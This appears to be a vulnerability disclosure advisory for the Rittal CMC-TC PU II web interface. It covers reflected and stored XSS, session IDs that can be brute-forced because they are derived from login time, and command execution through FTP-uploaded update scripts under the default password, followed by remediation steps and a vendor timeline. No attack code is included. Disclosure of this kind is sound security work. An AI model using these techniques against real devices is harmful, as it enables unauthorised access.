Overview:
   Quote from http://www.rimatrix5.com/ :
   "The Computer Multi Control Top-Concept (CMC-TC) from Rittal is
    a complete security management for preventive protection to guard
    against consequential costs, and is the central organisational unit
    for linking to the facility management.
    ...
    Processing Unit II (PU II) the nerve centre of the CMC-TC monitoring
    system. The PU II is the coordinator between the sensor unit and the
    network. It is configured via the integral Web server."

Details:

    Several vulnerabilities were identified from CMC-TC PU II web
    interface. These include XSS Type I, XSS Type II, weak session
    management and insecure default configuration.

    XSS Type 1:
    -----------
    Web application fails to validate and/or htmlencode user input when
    handling erroneous requests. This allows attacker to inject HTML and
    client-side scripts to victim's browser by creating suitable links.

    This vulnerability cannot be used for session hijacking, because
    CMC-TC PU II requires each valid request to contain current session
    ID as URL parameter. Requests without session ID are redirected to
    the login page. Therefore only phishing-type attacks or attacks
    against user's browser are possible.

    Successful exploitation requires that attacker can lure or force
    the user to follow the malicious link.

    XSS Type 2:
    -----------
    Web application fails to sanitize and/or htmlencode user input on
    system information page. This allows attacker to backdoor the device
    with HTML and browser interpreted content (such as ECMAscript
    dialects or other client-side scripts) as the content is displayed
    always after login. Persistent XSS allows attacker to modify
    displayed content or to change the victim's password (since old
    password is not required for password changes).

    Succesful exploitation requires access to the web management
    interface either with valid credentials or hijacked session.

    Weak session management:
    ------------------------
    CMC-TC PU II uses unixtime from login moment as session identifier,
    thus having insufficient randomization.

    If administrator login time is known and session is still valid, it
    can be brute-forced with relatively little effort. Proof-of-concept
    tool is provided, but any web application security tool (such as
    Burp Intruder) can be used for this.

    Successful exploitation requires that administrator login time is
    known (or a reasonably accurate guess can be made) and the session
    is still  active.

    Insecure default configuration:
    -------------------------------
    If default administrator password is not changed, attacker can run
    arbitrary commands and modify the system software by uploading
    malicious  update scripts via ftp. See update packet script contents
    for detailed information about the update process (eg update_l.sh).

    Software update packet expects user to have default password
    in place, since ftp-upload script contains hardcoded default
    password. The update will fail with no errors if it's been changed.

    What makes this interesting is the fact that the device does not
    offer operating system level access through any of the other
    management interfaces. Telnet and SSH both offer a menu based
    administration interface.

    Successful exploitation requires default administrator password and
    access to ftp port of the target device.

Remediation:
   * Restrict unauthorized network access to device
   * Change default passwords (instructions provided in Operation
     Manual)
   * Install patched Version 2.60a
   * Update future patch version as soon as available
   * Configure web interface to 'view only'
   * Review device configuration after an administrator has been let go
   * Do not follow untrusted links

Timeline:
   * 2008-xx-xx Issues discovered

   * 2009-02-25 Contacted vendor via e-mail

   * 2009-03-02 Contacted vendor via e-mail

   * 2009-03-02 Vendor response.
                XSS vulnerabilities were already fixed independently.

     Quote from vendor (sic):

     "thank you very much by the security information XXS.
      We have seen, your customer has check the PUII SW V2.45.
      Actual we have a better Version 2.60a with more seyurity.
      Our XXS-Check of that Version is OK.
      If you has by the basic more information for Rittal,
      we are fine to get . "
